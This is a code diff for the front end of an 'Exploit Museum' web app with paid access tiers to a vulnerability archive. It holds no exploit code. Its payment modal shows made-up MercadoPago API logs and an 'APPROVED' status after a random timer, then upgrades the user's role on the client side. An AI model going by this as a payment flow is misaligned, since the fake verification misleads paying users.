-                             <p class="mt-4 text-yellow-500 animate-pulse">&gt; EXECUTION HALTED BY SAFEGUARD PROTOCOL_</p>
-                           </div>
-                        </div>
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                          <div class="bg-slate-900/30 p-6 rounded border border-white/5">
-                            <h4 class="text-cyan-500 text-xs font-bold mb-3 uppercase tracking-widest flex items-center gap-2"><div data-lucide="globe" size="14"></div> Real World Impact</h4>
-                            <p class="text-slate-300 text-sm leading-relaxed">\${vuln.impact}</p>
-                          </div>
-                          <div class="bg-slate-900/30 p-6 rounded border border-white/5">
-                            <h4 class="text-red-500 text-xs font-bold mb-3 uppercase tracking-widest flex items-center gap-2"><div data-lucide="alert-triangle" size="14"></div> Affected Targets</h4>
-                            <div class="flex flex-wrap gap-2">
-                              \${vuln.affected.map(t => \`<span class="px-2 py-1 bg-red-900/20 border border-red-900/30 rounded text-xs text-red-200">\${t}</span>\`).join('')}
-                            </div>
-                          </div>
-                        </div>
-                      </div>
-                      <div class="space-y-6">
-                        <div class="bg-black rounded border border-slate-800 p-1 h-64 relative overflow-hidden flex items-center justify-center">
-                          \${renderVault3D()}
-                          <div class="absolute bottom-4 left-0 w-full text-center text-[10px] font-mono text-purple-500/50">SECURE CONTAINER: \${vuln.id.toUpperCase()}</div>
-                          <div class="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20 pointer-events-none"></div>
-                        </div>
-                        <div class="bg-slate-900/50 rounded border border-white/5 p-6">
-                          <h3 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Evidence Files</h3>
-                          <div class="space-y-3">
-                            <div class="flex items-center justify-between p-3 bg-slate-800/50 rounded border border-white/5 hover:border-cyan-500/30 cursor-pointer transition group">
-                              <div class="flex items-center gap-3"><div data-lucide="fingerprint" size="16" class="text-slate-500 group-hover:text-cyan-400"></div><span class="text-sm text-slate-300 group-hover:text-white">Technical_Report.pdf</span></div>
-                              <span class="text-[10px] text-slate-600 font-mono">ENCRYPTED</span>
-                            </div>
-                            <div class="flex items-center justify-between p-3 bg-slate-800/50 rounded border border-white/5 hover:border-cyan-500/30 cursor-pointer transition group">
-                              <div class="flex items-center gap-3"><div data-lucide="hash" size="16" class="text-slate-500 group-hover:text-cyan-400"></div><span class="text-sm text-slate-300 group-hover:text-white">IoC_Hashes.txt</span></div>
-                              <span class="text-[10px] text-slate-600 font-mono">4KB</span>
-                            </div>
-                          </div>
-                        </div>
-                      </div>
-                    </div>
-            \`;
-            document.getElementById('vuln-detail-content').innerHTML = content;
-             if(window.lucide) {
-                window.lucide.createIcons();
+        /**
+         * Maneja la selección de una vulnerabilidad.
+         */
+        function handleSelectVuln(vuln) {
+            const locked = vuln.premium && !hasAccess(vuln.reqRole);
+            if (!locked) {
+                setState({ selectedVuln: vuln, view: 'vuln-detail' });
+            } else {
+                const requiredPlan = PLANS.find(p => p.id === vuln.reqRole);
+                handleUpgrade(requiredPlan);
             }
         }
+
+        // --- FUNCIONES DE RENDERIZADO DE COMPONENTES ---
+
+        /**
+         * Componente: Glitch Text
+         */
+        function GlitchText(text, tag = 'h1', className = '') {
+            return `
+                <${tag} data-text="${text}" class="relative inline-block ${className} group glitch-text glitch-text-h1">
+                    <span class="relative z-10">${text}</span>
+                    <span class="absolute top-0 left-0 -ml-0.5 translate-x-[2px] text-red-500 opacity-0 group-hover:opacity-70 animate-pulse z-0 glitch-after">${text}</span>
+                    <span class="absolute top-0 left-0 -ml-0.5 -translate-x-[2px] text-cyan-500 opacity-0 group-hover:opacity-70 animate-pulse delay-75 z-0 glitch-before">${text}</span>
+                </${tag}>
+            `;
+        }
         
-        function renderVault3D() {
-             // Retorna el HTML para el efecto 3D
-             return \`
+        /**
+         * Componente: Vault 3D (Estructura de la caja)
+         */
+        function Vault3D() {
+            return `
                 <div class="w-full h-64 flex items-center justify-center perspective-1000 my-8 overflow-hidden">
-                  <div class="relative w-40 h-40 preserve-3d animate-spin-slow-y">
-                    <div class="absolute inset-0 bg-purple-900/20 border border-purple-500/50 flex items-center justify-center [transform:translateZ(20px)] backdrop-blur-sm">
-                      <div data-lucide="lock" size="40" class="text-purple-400"></div>
+                    <div class="relative w-40 h-40 preserve-3d animate-spin-slow-y">
+                        <div class="absolute inset-0 bg-purple-900/20 border border-purple-500/50 flex items-center justify-center translate-z-20 backdrop-blur-sm">
+                            ${getIcon('Lock', 'text-purple-400', 40)}
+                        </div>
+                         <div class="absolute inset-0 bg-cyan-900/20 border border-cyan-500/50 flex items-center justify-center -translate-z-20 rotate-180 backdrop-blur-sm">
+                            ${getIcon('Database', 'text-cyan-400', 40)}
+                        </div>
+                        <div class="absolute inset-0 bg-purple-800/10 border border-purple-500/30 w-40 h-40 rotate-y-90 translate-x-20 origin-right"></div>
+                        <div class="absolute inset-0 bg-purple-800/10 border border-purple-500/30 w-40 h-40 -rotate-y-90 -translate-x-20 origin-left"></div>
                     </div>
-                     <div class="absolute inset-0 bg-cyan-900/20 border border-cyan-500/50 flex items-center justify-center [transform:translateZ(-20px)_rotateY(180deg)] backdrop-blur-sm">
-                      <div data-lucide="database" size="40" class="text-cyan-400"></div>
-                    </div>
-                    <div class="absolute inset-0 bg-purple-800/10 border border-purple-500/30 w-40 h-40 [transform:rotateY(90deg)_translateX(80px)] [transform-origin:right]"></div>
-                    <div class="absolute inset-0 bg-purple-800/10 border border-purple-500/30 w-40 h-40 [transform:rotateY(-90deg)_translateX(-80px)] [transform-origin:left]"></div>
-                  </div>
+                    <div class="absolute inset-0 pointer-events-none bg-gradient-to-t from-slate-950 via-transparent to-transparent"></div>
                 </div>
-             \`;
+            `;
         }
 
-        // --- 6. MODAL DE PAGO (LÓGICA) ---
+        /**
+         * Componente: Payment Modal (Lógica de simulación de pago)
+         */
+        function renderPaymentModal() {
+            if (!modalPlan) return;
 
-        function showPaymentModal(planId) {
-            const plan = PLANS.find(p => p.id === planId);
-            if (!plan) return;
-            state.modalPlan = plan;
+            const modal = document.createElement('div');
+            modal.className = 'fixed inset-0 z-50 flex items-center justify-center bg-black/95 backdrop-blur-sm p-4';
             
-            const modal = document.getElementById('payment-modal');
-            modal.classList.remove('hidden');
-            
-            // Renderizar el modal
-            renderPaymentModalContent('qr');
-        }
+            // Lógica interna del estado del modal
+            let step = 'qr';
+            let timer = 0;
+            let interval = null;
 
-        function closePaymentModal() {
-            document.getElementById('payment-modal').classList.add('hidden');
-            state.modalPlan = null;
-        }
-        
-        function renderPaymentModalContent(step) {
-            const modal = document.getElementById('payment-modal');
-            const plan = state.modalPlan;
-            let content = '';
+            function updateModalStep(newStep) {
+                step = newStep;
+                renderModalContent();
+            }
+
+            function handleCheckPayment() {
+                updateModalStep('verifying');
+                
+                // Simulación de tiempo de espera y progreso
+                interval = setInterval(() => {
+                    timer += Math.random() * 10;
+                    if (timer >= 100) {
+                        clearInterval(interval);
+                        timer = 100;
+                        updateModalStep('success');
+                        // Llama al handler de éxito después de un breve retraso
+                        setTimeout(handlePaymentSuccess, 2500);
+                    }
+                    renderModalContent(); // Re-renderiza el contenido para actualizar la barra de progreso
+                }, 150);
+            }
             
-            if (step === 'qr') {
-                content = \`
-                    <div class="w-full max-w-md bg-slate-900 border border-purple-500/50 rounded-xl p-6 relative overflow-hidden shadow-[0_0_50px_rgba(168,85,247,0.2)]">
-                        <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-purple-500 to-transparent animate-scan"></div>
-                        <button onclick="closePaymentModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white z-10">
-                            <div data-lucide="x-circle" size="24"></div>
-                        </button>
+            function renderModalContent() {
+                const content = modal.querySelector('#modal-content');
+                if (!content) return;
+                
+                let html = '';
+                const plan = modalPlan;
+
+                if (step === 'qr') {
+                    html = `
                         <div class="text-center space-y-6">
                             <div class="space-y-2">
                                 <h3 class="text-xl font-bold text-cyan-400 tracking-widest">SECURE GATEWAY</h3>
-                                <p class="text-slate-400 text-sm">Esperando confirmación de red para nivel \${plan.name}...</p>
+                                <p class="text-slate-400 text-sm">Esperando confirmación de red para nivel ${plan.name}...</p>
                             </div>
-                            <div class="relative w-48 h-48 mx-auto bg-white p-2 rounded-lg group cursor-pointer" onclick="handleCheckPayment()">
+
+                            <div id="qr-target" class="relative w-48 h-48 mx-auto bg-white p-2 rounded-lg group cursor-pointer">
                                 <div class="w-full h-full bg-black flex items-center justify-center overflow-hidden relative">
-                                    <div data-lucide="qr-code" size="150" class="text-white"></div>
+                                    ${getIcon('QrCode', 'text-white', 150)}
                                     <div class="absolute inset-0 bg-gradient-to-b from-transparent via-purple-500/30 to-transparent h-2 w-full animate-scan-fast"></div>
                                 </div>
                                 <div class="absolute -inset-2 border-2 border-dashed border-purple-500/30 rounded-xl animate-spin-slow"></div>
                             </div>
+
                             <div class="bg-slate-800/50 p-4 rounded border border-slate-700 text-left space-y-2 font-mono text-xs relative">
                                 <div class="absolute top-2 right-2 w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
                                 <div class="flex justify-between">
                                     <span class="text-slate-400">Amount (ARS):</span>
-                                    <span class="text-green-400 font-bold">\${formatCurrency(plan.priceUsd * USD_TO_ARS)}</span>
+                                    <span class="text-green-400 font-bold">$ ${(plan.priceUsd * USD_TO_ARS).toLocaleString('es-AR')}</span>
                                 </div>
                                 <div class="flex justify-between">
                                     <span class="text-slate-400">Amount (USD):</span>
-                                    <span class="text-green-400 font-bold">\$$\{plan.priceUsd\}</span>
+                                    <span class="text-green-400 font-bold">$ ${plan.priceUsd}</span>
                                 </div>
                                 <div class="flex justify-between">
                                     <span class="text-slate-400">Node Alias:</span>
-                                    <span class="text-white select-all cursor-copy">\${MP_ALIAS}</span>
+                                    <span class="text-white select-all cursor-copy">${MP_ALIAS}</span>
                                 </div>
                                 <div class="flex justify-between">
                                     <span class="text-slate-400">Contact:</span>
-                                    <span class="text-white select-all cursor-copy">\${EMAIL_CONTACT}</span>
+                                    <span class="text-white select-all cursor-copy">${EMAIL_CONTACT}</span>
                                 </div>
                             </div>
-                            <button onclick="handleCheckPayment()" class="w-full py-3 bg-purple-900/50 hover:bg-purple-800 border border-purple-500 text-white font-bold rounded transition-all flex items-center justify-center gap-2">
-                                <div data-lucide="activity" size="16" class="animate-pulse"></div>
+
+                            <button id="check-payment-btn" class="w-full py-3 bg-purple-900/50 hover:bg-purple-800 border border-purple-500 text-white font-bold rounded transition-all flex items-center justify-center gap-2">
+                                ${getIcon('Activity', 'animate-pulse', 16)}
                                 VERIFICAR TRANSACCIÓN
                             </button>
-                            <p class="text-[10px] text-slate-600 font-mono">ID: \${Math.random().toString(36).substring(7).toUpperCase()}-TXN-ENC</p>
+                            <p class="text-[10px] text-slate-600 font-mono">ID: ${Math.random().toString(36).substring(7).toUpperCase()}-TXN-ENC</p>
                         </div>
-                    </div>
-                \`;
-            } else if (step === 'verifying') {
-                content = \`
-                    <div class="w-full max-w-md bg-slate-900 border border-purple-500/50 rounded-xl p-6 relative overflow-hidden shadow-[0_0_50px_rgba(168,85,247,0.2)]">
-                        <button onclick="closePaymentModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white z-10">
-                            <div data-lucide="x-circle" size="24"></div>
-                        </button>
+                    `;
+                } else if (step === 'verifying') {
+                    const timerText = timer >= 100 ? `<p>&gt; Upgrading user privileges...</p>` : `
+                        <p class="text-slate-500">&gt; Initializing secure socket...</p>
+                        <p>&gt; Querying MercadoPago API v2.0 endpoint...</p>
+                        ${timer > 30 ? `<p>&gt; Token: ${Math.random().toString(36).substring(2)}...</p>` : ''}
+                        ${timer > 50 ? `<p>&gt; Payment Status: <span class="text-yellow-400">PENDING</span></p>` : ''}
+                        ${timer > 70 ? `<p>&gt; Validating amount match...</p>` : ''}
+                        ${timer > 90 ? `<p>&gt; Payment Status: <span class="text-green-400">APPROVED</span></p>` : ''}
+                    `;
+
+                    html = `
                         <div class="text-center py-12 space-y-6">
-                            <div data-lucide="server" class="mx-auto text-cyan-400 animate-pulse" size="64"></div>
+                            ${getIcon('Server', 'mx-auto text-cyan-400 animate-pulse', 64)}
                             <h3 class="text-xl font-mono text-white animate-pulse">HANDSHAKE IN PROGRESS...</h3>
                             <div class="w-full bg-slate-800 h-2 rounded-full overflow-hidden">
-                                <div id="modal-progress-bar" class="h-full bg-cyan-400 transition-all duration-100" style="width: 0%"></div>
+                                <div class="h-full bg-cyan-400 transition-all duration-100" style="width: ${timer}%;"></div>
                             </div>
-                            <div id="modal-log" class="font-mono text-xs text-green-400 text-left h-24 overflow-hidden bg-black p-2 rounded border border-slate-800 opacity-80">
-                                <p class="text-slate-500">&gt; Initializing secure socket...</p>
+                            <div class="font-mono text-xs text-green-400 text-left h-24 overflow-hidden bg-black p-2 rounded border border-slate-800 opacity-80">
+                                ${timerText}
                             </div>
                         </div>
-                    </div>
-                \`;
-            } else if (step === 'success') {
-                content = \`
-                    <div class="w-full max-w-md bg-slate-900 border border-purple-500/50 rounded-xl p-6 relative overflow-hidden shadow-[0_0_50px_rgba(168,85,247,0.2)]">
-                        <button onclick="closePaymentModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white z-10">
-                            <div data-lucide="x-circle" size="24"></div>
-                        </button>
+                    `;
+                } else if (step === 'success') {
+                    html = `
                         <div class="text-center py-8 space-y-4">
                             <div class="inline-block p-4 rounded-full bg-green-500/20 border border-green-500 mb-4 shadow-[0_0_30px_rgba(34,197,94,0.4)]">
-                                <div data-lucide="check-circle" class="text-green-400" size="48"></div>
+                                ${getIcon('CheckCircle', 'text-green-400', 48)}
                             </div>
-                            <h2 class="text-3xl font-bold text-white tracking-wider glitch-text">ACCESS GRANTED</h2>
-                            <p class="text-slate-300">Bienvenido al nivel \${plan.name}.</p>
+                            <h2 class="text-3xl font-bold text-white tracking-wider glitch-text" data-text="ACCESS GRANTED">
+                                <span class="relative z-10">ACCESS GRANTED</span>
+                                <span class="absolute top-0 left-0 -ml-0.5 translate-x-[2px] text-red-500 opacity-70 animate-pulse z-0 glitch-after">ACCESS GRANTED</span>
+                                <span class="absolute top-0 left-0 -ml-0.5 -translate-x-[2px] text-cyan-500 opacity-70 animate-pulse delay-75 z-0 glitch-before">ACCESS GRANTED</span>
+                            </h2>
+                            <p class="text-slate-300">Bienvenido al nivel ${plan.name}.</p>
                             <p class="text-xs text-slate-500 font-mono">Decrypting Vault Assets...</p>
                         </div>
-                    </div>
-                \`;
-            }
-            modal.innerHTML = content;
-             if(window.lucide) {
-                window.lucide.createIcons();
-            }
-        }
-        
-        function handleCheckPayment() {
-            renderPaymentModalContent('verifying');
-            let timer = 0;
-            const logElement = document.getElementById('modal-log');
-            const barElement = document.getElementById('modal-progress-bar');
-            
-            const log = (message, color = 'text-green-400') => {
-                logElement.innerHTML += \`<p class="\${color}">&gt; \${message}</p>\`;
-                logElement.scrollTop = logElement.scrollHeight;
-            };
-
-            const interval = setInterval(() => {
-                timer += Math.random() * 10;
-                if (timer > 100) timer = 100;
-
-                barElement.style.width = \`\${timer}%\`;
-
-                if (timer > 30 && timer < 40 && !logElement.innerHTML.includes('Token:')) {
-                    log(\`Token: \${Math.random().toString(36).substring(2)}...\`);
-                }
-                if (timer > 50 && timer < 60 && !logElement.innerHTML.includes('Status: PENDING')) {
-                    log('Payment Status: PENDING', 'text-yellow-400');
-                }
-                if (timer > 70 && timer < 80 && !logElement.innerHTML.includes('Validating amount')) {
-                    log('Validating amount match...');
+                    `;
+                    // Si es éxito, eliminamos el modal después de un tiempo, ya lo maneja handlePaymentSuccess
                 }
                 
-                if (timer >= 100) {
-                    clearInterval(interval);
-                    log('Payment Status: APPROVED', 'text-green-400 font-bold');
-                    log('Upgrading user privileges...');
-                    setTimeout(() => {
-                        const plan = state.modalPlan;
-                        state.user.role = plan.id;
-                        renderPaymentModalContent('success');
-                        setTimeout(() => {
-                            closePaymentModal();
-                            navigate('vault');
-                        }, 2500);
-                    }, 500);
+                content.innerHTML = html;
+
+                // Re-attach event listeners on QR step
+                if (step === 'qr') {
+                    modal.querySelector('#qr-target')?.addEventListener('click', handleCheckPayment);
+                    modal.querySelector('#check-payment-btn')?.addEventListener('click', handleCheckPayment);
                 }
-            }, 150);
+            }
+
+            modal.innerHTML = `
+                <div class="w-full max-w-md bg-slate-900 border border-purple-500/50 rounded-xl p-6 relative overflow-hidden shadow-[0_0_50px_rgba(168,85,247,0.2)]">
+                    <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-purple-500 to-transparent animate-scan"></div>
+                    <button id="close-modal-btn" class="absolute top-4 right-4 text-slate-400 hover:text-white z-10">
+                        ${getIcon('XCircle', '', 24)}
+                    </button>
+                    <div id="modal-content"></div>
+                </div>
+            `;
+            
+            // Adjuntar el listener de cierre
+            modal.querySelector('#close-modal-btn').addEventListener('click', () => {
+                if (interval) clearInterval(interval);
+                handleModalClose();
+            });
+
+            document.getElementById('modal-container').innerHTML = '';
+            document.getElementById('modal-container').appendChild(modal);
+
+            // Primera renderización del contenido
+            renderModalContent();
         }
 
-        // --- 7. INICIALIZACIÓN ---
+        // --- FUNCIONES DE VISTA (Simulación de Componentes de Página) ---
 
-        function initMatrixRain() {
-            const canvas = document.getElementById('matrix-rain');
-            const ctx = canvas.getContext('2d');
+        function renderNavbar() {
+            const navbarHtml = `
+                <div class="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
+                    <div id="nav-home-btn" class="flex items-center gap-2 cursor-pointer group">
+                        ${getIcon('Shield', 'text-purple-500 group-hover:text-cyan-400 transition-colors', 24)}
+                        <span class="font-bold text-xl tracking-tighter text-white">
+                            EXPLOIT<span class="text-purple-500 group-hover:text-cyan-400 transition-colors">MUSEUM</span>
+                        </span>
+                    </div>
+                    
+                    <div class="hidden md:flex items-center gap-8 text-xs font-mono tracking-widest">
+                        <button data-view="home" class="nav-btn hover:text-cyan-400 transition ${view === 'home' ? 'text-cyan-400 border-b border-cyan-400' : ''}">HOME</button>
+                        <button data-view="vault" class="nav-btn hover:text-cyan-400 transition ${view === 'vault' ? 'text-cyan-400 border-b border-cyan-400' : ''}">ARCHIVE</button>
+                        <button data-view="pricing" class="nav-btn hover:text-cyan-400 transition ${view === 'pricing' ? 'text-cyan-400 border-b border-cyan-400' : ''}">ACCESS</button>
+                    </div>
+
+                    <div class="flex items-center gap-4">
+                        <div class="text-right hidden sm:block">
+                            <div class="text-[10px] text-slate-500 uppercase tracking-widest">Clearance</div>
+                            <div class="text-xs font-bold uppercase ${user.role === 'root' ? 'text-red-500 animate-pulse' : 'text-cyan-400'}">
+                                ${user.role === 'root' ? 'GOD MODE' : user.role}
+                            </div>
+                        </div>
+                        <div class="w-8 h-8 rounded border flex items-center justify-center ${user.role === 'root' ? 'bg-red-900/20 border-red-500' : 'bg-slate-800 border-slate-700'}">
+                            ${getIcon('User', user.role === 'root' ? 'text-red-400' : 'text-slate-400', 16)}
+                        </div>
+                    </div>
+                </div>
+            `;
+            const navbar = document.getElementById('navbar');
+            navbar.innerHTML = navbarHtml;
+
+            // Adjuntar event listeners
+            navbar.querySelector('#nav-home-btn').addEventListener('click', () => handleViewChange('home'));
+            navbar.querySelectorAll('.nav-btn').forEach(btn => {
+                btn.addEventListener('click', () => handleViewChange(btn.getAttribute('data-view')));
+            });
+        }
+
+        function renderHome() {
+            const homeView = document.getElementById('home-view');
             
-            const resizeCanvas = () => {
+            const html = `
+                <div class="flex flex-col items-center justify-center min-h-[80vh] text-center px-4 relative overflow-hidden">
+                    <!-- Background decorative blobs -->
+                    <div class="absolute top-1/4 left-1/4 w-96 h-96 bg-purple-600/10 rounded-full blur-[100px] pointer-events-none"></div>
+                    <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-cyan-600/10 rounded-full blur-[100px] pointer-events-none"></div>
+
+                    <div class="mb-6 inline-flex items-center gap-2 px-4 py-1 rounded-full border border-cyan-500/30 bg-cyan-950/20 text-cyan-400 text-[10px] font-mono tracking-widest uppercase">
+                        <span class="w-2 h-2 rounded-full bg-cyan-400 animate-pulse shadow-[0_0_10px_#22d3ee]"></span>
+                        System Online: ${VULNERABILITIES.length} Threats Indexed
+                    </div>
+
+                    ${GlitchText("THE EXPLOIT MUSEUM", 'h1', 'text-5xl md:text-8xl font-black tracking-tighter mb-6 text-white drop-shadow-[0_0_30px_rgba(168,85,247,0.5)]')}
+                    
+                    <p class="max-w-2xl text-slate-400 text-lg mb-10 leading-relaxed">
+                        La base de datos definitiva de <span class="text-white font-bold">Ciberseguridad Ofensiva</span>. 
+                        Desde el primer gusano Morris hasta los exploits Zero-Day de hoy. 
+                        Aprende la historia rompiendo el código.
+                    </p>
+
+                    <div class="flex flex-col sm:flex-row gap-4">
+                        <button id="home-vault-btn" class="px-8 py-4 bg-white text-black font-bold hover:bg-cyan-50 transition flex items-center gap-2 rounded-sm shadow-[0_0_20px_rgba(255,255,255,0.2)] group">
+                            ${getIcon('Database', 'group-hover:scale-110 transition-transform', 18)}
+                            EXPLORAR ARCHIVO
+                        </button>
+                        <button id="home-pricing-btn" class="px-8 py-4 bg-transparent border border-white/20 text-white font-bold hover:border-purple-500 hover:text-purple-400 transition flex items-center gap-2 rounded-sm backdrop-blur-sm">
+                            ${getIcon('Zap', '', 18)}
+                            OBTENER ACCESO
+                        </button>
+                    </div>
+
+                    <div class="mt-24 grid grid-cols-1 md:grid-cols-3 gap-4 text-left w-full max-w-6xl px-4">
+                        ${[
+                            { icon: 'Ghost', title: '0-Day Analysis', desc: 'Análisis profundo de vulnerabilidades el mismo día de su publicación.' },
+                            { icon: 'Terminal', title: 'Payloads Reales', desc: 'Snippets de código extraídos de incidentes reales (sanitizados).' },
+                            { icon: 'Globe', title: 'Cyber Warfare', desc: 'Historia de ataques estado-nación: Stuxnet, NotPetya, SolarWinds.' }
+                        ].map((item, i) => `
+                            <div class="p-6 rounded border border-white/5 bg-slate-900/40 backdrop-blur-sm hover:border-cyan-500/30 transition duration-300 group">
+                                ${getIcon(item.icon, 'text-slate-600 mb-4 group-hover:text-cyan-400 transition-colors', 24)}
+                                <h3 class="text-lg font-bold text-white mb-2 font-mono uppercase tracking-wider">${item.title}</h3>
+                                <p class="text-sm text-slate-400 leading-relaxed">${item.desc}</p>
+                            </div>
+                        `).join('')}
+                    </div>
+                </div>
+            `;
+            homeView.innerHTML = html;
+            
+            // Adjuntar event listeners
+            homeView.querySelector('#home-vault-btn').addEventListener('click', () => handleViewChange('vault'));
+            homeView.querySelector('#home-pricing-btn').addEventListener('click', () => handleViewChange('pricing'));
+        }
+
+        function renderPricing() {
+            const pricingView = document.getElementById('pricing-view');
+            const planCards = PLANS.map(plan => `
+                <div class="relative bg-slate-900/80 backdrop-blur-md rounded-xl border ${plan.borderColor} p-8 flex flex-col hover:transform hover:-translate-y-1 transition duration-300 shadow-2xl overflow-hidden group">
+                    ${plan.id === 'root' ? '<div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-500 via-orange-500 to-red-500 animate-scan-fast"></div>' : ''}
+                    
+                    <div class="mb-6">
+                        <h3 class="text-2xl font-black uppercase tracking-widest bg-gradient-to-r ${plan.color} bg-clip-text text-transparent">${plan.name}</h3>
+                        <div class="flex items-end gap-2 mt-4">
+                            <span class="text-5xl font-bold text-white">$${plan.priceUsd}</span>
+                            <span class="text-slate-500 mb-2 text-xs font-mono uppercase">/ Pago Único</span>
+                        </div>
+                        <div class="text-xs text-slate-500 font-mono mt-2 pt-2 border-t border-white/5">
+                            ≈ $${(plan.priceUsd * USD_TO_ARS).toLocaleString('es-AR')} ARS
+                        </div>
+                    </div>
+
+                    <ul class="space-y-4 mb-8 flex-1">
+                        ${plan.features.map((feat) => `
+                            <li class="flex items-start gap-3 text-slate-300 text-sm font-mono">
+                                ${getIcon('CheckCircle', `mt-0.5 shrink-0 ${plan.id === 'root' ? 'text-red-500' : 'text-cyan-500'}`, 16)}
+                                ${feat}
+                            </li>
+                        `).join('')}
+                    </ul>
+
+                    <button 
+                        data-plan-id="${plan.id}"
+                        class="upgrade-btn w-full py-4 rounded font-bold uppercase tracking-widest transition-all relative overflow-hidden
+                        ${user.role === plan.id 
+                            ? 'bg-slate-800 text-slate-500 cursor-not-allowed border border-slate-700' 
+                            : `bg-white text-black hover:bg-slate-200 border border-transparent`
+                        }
+                        "
+                        ${user.role === plan.id ? 'disabled' : ''}
+                    >
+                        ${plan.id === 'root' && user.role !== 'root' ? '<span class="absolute inset-0 bg-red-500 mix-blend-multiply opacity-20"></span>' : ''}
+                        ${user.role === plan.id ? 'CURRENT LEVEL' : 'INITIATE UPGRADE'}
+                    </button>
+                </div>
+            `).join('');
+
+            const html = `
+                <div class="max-w-7xl mx-auto px-4 py-10">
+                    <div class="text-center mb-16">
+                        <h2 class="text-4xl font-bold text-white mb-4 tracking-tight">SECURITY CLEARANCE LEVELS</h2>
+                        <p class="text-slate-400">El conocimiento es poder. Elige tu nivel de acceso.</p>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                        ${planCards}
+                    </div>
+                </div>
+            `;
+            pricingView.innerHTML = html;
+            
+            // Adjuntar event listeners
+            pricingView.querySelectorAll('.upgrade-btn').forEach(btn => {
+                if (!btn.disabled) {
+                    btn.addEventListener('click', () => {
+                        const plan = PLANS.find(p => p.id === btn.getAttribute('data-plan-id'));
+                        handleUpgrade(plan);
+                    });
+                }
+            });
+        }
+
+        function renderVault() {
+            const vaultView = document.getElementById('vault-view');
+            const filteredVulns = getFilteredVulns();
+
+            const vulnCards = filteredVulns.map((vuln) => {
+                const locked = vuln.premium && !hasAccess(vuln.reqRole);
+                const roleText = locked ? `Requires ${vuln.reqRole.toUpperCase()}` : '';
+                
+                return `
+                    <div 
+                        data-vuln-id="${vuln.id}"
+                        class="vuln-card relative p-6 rounded border transition-all duration-200 cursor-pointer group overflow-hidden
+                        ${locked 
+                            ? 'bg-slate-900/30 border-slate-800 hover:border-slate-700' 
+                            : 'bg-slate-900/80 border-white/10 hover:border-cyan-500/50 hover:bg-slate-800'
+                        }
+                        "
+                    >
+                        <!-- Scanline effect on hover -->
+                        ${!locked ? '<div class="absolute inset-0 bg-gradient-to-b from-transparent via-cyan-500/5 to-transparent opacity-0 group-hover:opacity-100 translate-y-[-100%] group-hover:translate-y-[100%] transition-all duration-700 pointer-events-none"></div>' : ''}
+
+                        <div class="flex justify-between items-start mb-4">
+                            <div class="px-2 py-1 rounded text-[10px] font-bold font-mono tracking-wider ${locked ? 'bg-slate-800 text-slate-600' : 'bg-purple-900/20 text-purple-400 border border-purple-500/20'}">
+                                ${vuln.cve.split(' ')[0]}
+                            </div>
+                            ${locked ? getIcon('Lock', 'text-slate-700', 16) : getIcon('Unlock', 'text-cyan-500 opacity-0 group-hover:opacity-100 transition', 16)}
+                        </div>
+
+                        <h3 class="text-lg font-bold mb-2 font-mono uppercase truncate ${locked ? 'text-slate-600 blur-[1px]' : 'text-white'}">
+                            ${vuln.title}
+                        </h3>
+
+                        <div class="flex gap-2 mb-4">
+                            <span class="text-[10px] uppercase px-1.5 py-0.5 rounded border ${locked ? 'border-slate-800 text-slate-700' : 'border-slate-700 text-slate-400'}">
+                                ${vuln.type}
+                            </span>
+                        </div>
+
+                        ${locked ? `
+                            <div class="absolute inset-0 flex items-center justify-center backdrop-blur-sm bg-black/20 z-10">
+                                <div class="bg-black border border-red-900/50 p-3 rounded flex items-center gap-2 text-red-500 font-mono text-xs uppercase tracking-widest shadow-2xl transform group-hover:scale-105 transition">
+                                    ${getIcon('Lock', '', 12)}
+                                    ${roleText}
+                                </div>
+                            </div>
+                        ` : ''}
+
+                        <div class="flex items-center justify-between pt-4 border-t border-white/5">
+                            <span class="text-xs font-mono ${locked ? 'text-slate-800' : 'text-slate-500'}">${vuln.year}</span>
+                            
+                            <div class="flex items-center gap-2">
+                                <span class="text-xs font-bold ${locked ? 'text-slate-800' : vuln.score >= 9 ? 'text-red-500' : 'text-yellow-500'}">
+                                    CVSS ${vuln.score}
+                                </span>
+                                ${getIcon('AlertOctagon', locked ? 'text-slate-800' : vuln.score >= 9 ? 'text-red-500' : 'text-yellow-500', 12)}
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+
+            const html = `
+                <div class="max-w-7xl mx-auto px-4">
+                    <div class="flex flex-col md:flex-row items-end justify-between mb-8 border-b border-white/10 pb-6 gap-4">
+                        <div>
+                            <h2 class="text-3xl font-bold text-white flex items-center gap-3 tracking-tight">
+                                ${getIcon('Database', 'text-purple-500', 24)}
+                                THREAT DATABASE
+                            </h2>
+                            <p class="text-slate-400 mt-2 font-mono text-sm flex items-center gap-2">
+                                <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
+                                Indexing ${filteredVulns.length} records.
+                            </p>
+                        </div>
+                        
+                        <div class="w-full md:w-auto relative">
+                            <input 
+                                type="text" 
+                                id="search-input"
+                                placeholder="Search CVE, Name, Type..." 
+                                value="${searchTerm}"
+                                class="w-full md:w-64 bg-slate-900 border border-slate-700 rounded py-2 pl-10 pr-4 text-sm focus:outline-none focus:border-cyan-500 text-white placeholder-slate-600"
+                            />
+                            ${getIcon('Search', 'absolute left-3 top-2.5 text-slate-600', 16)}
+                        </div>
+                    </div>
+
+                    <div id="vuln-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                        ${vulnCards}
+                    </div>
+                </div>
+            `;
+            vaultView.innerHTML = html;
+            
+            // Adjuntar event listeners
+            vaultView.querySelector('#search-input').addEventListener('input', (e) => {
+                // Actualiza el estado de la búsqueda y re-renderiza
+                setState({ searchTerm: e.target.value });
+            });
+            
+            vaultView.querySelectorAll('.vuln-card').forEach(card => {
+                card.addEventListener('click', () => {
+                    const vulnId = card.getAttribute('data-vuln-id');
